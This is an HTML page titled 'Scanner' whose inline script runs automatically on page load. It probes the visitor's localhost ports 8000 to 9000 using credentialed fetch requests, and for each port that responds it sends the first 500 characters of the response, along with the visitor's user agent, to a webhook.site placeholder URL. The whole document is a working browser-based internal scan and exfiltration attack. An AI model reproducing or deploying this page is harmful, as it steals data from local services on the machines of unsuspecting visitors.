<!DOCTYPE html>
<html>
<head>
    <title>Scanner</title>
</head>
<body>
    <script>
        const WEBHOOK_URL = "https://webhook.site/your-webhook-url";

        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({ status: "started", userAgent: navigator.userAgent }));

        async function scan() {
            const startPort = 8000;
            const endPort = 9000;
            const batchSize = 200;

            for (let i = startPort; i <= endPort; i += batchSize) {
                const tasks = [];
                for (let port = i; port < i + batchSize && port <= endPort; port++) {
                    tasks.push(checkPort(port));
                }
                
                await Promise.all(tasks);
            }
            
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({ status: "finished" }));
        }

        async function checkPort(port) {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 1500);

            try {
                const response = await fetch(`http://localhost:${port}`, {
                    mode: 'cors',
                    credentials: 'include',
                    signal: controller.signal
                });

                const data = await response.text();

                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
                    found: true,
                    port: port,
                    content: data.substring(0, 500)
                }));

            } catch (err) {

            } finally {
                clearTimeout(timeout);
            }
        }
        scan();
    </script>
</body>
</html>
